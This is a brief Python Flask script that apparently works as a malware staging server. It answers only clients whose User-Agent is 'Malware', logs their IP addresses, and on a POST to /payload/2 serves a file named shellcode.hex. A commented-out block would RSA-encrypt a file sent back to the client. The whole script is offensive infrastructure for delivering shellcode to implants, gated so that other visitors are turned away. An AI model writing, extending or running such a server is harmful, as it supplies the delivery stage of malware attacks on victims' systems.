from flask import Flask, request, send_file, abort
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

app = Flask(__name__)

@app.before_request
def check_user_agent():
    user_agent = request.headers.get('User-Agent')
    if user_agent != 'Malware':
        abort(403)

@app.route('/payload/<int:id>', methods=['POST'])
def payload(id):
    if id == 2:
        print("request received from : ", request.remote_addr)
        # public_key = request.data
        # print("public_key : ", public_key)
        # rsa_public_key = RSA.import_key(public_key)
        # cipher = PKCS1_OAEP.new(rsa_public_key)
        # with open('file-to-send.txt', 'rb') as f:
        #     message = f.read()
        # encrypted_message = cipher.encrypt(message)
        # print(encrypted_message)
        # return encrypted_message
        return send_file('shellcode.hex', mimetype='text/plain')
    else:
        return 'No payload for id {}'.format(id)

if __name__ == '__main__':
    app.debug = True
    app.run(host='0.0.0.0', port=5000)
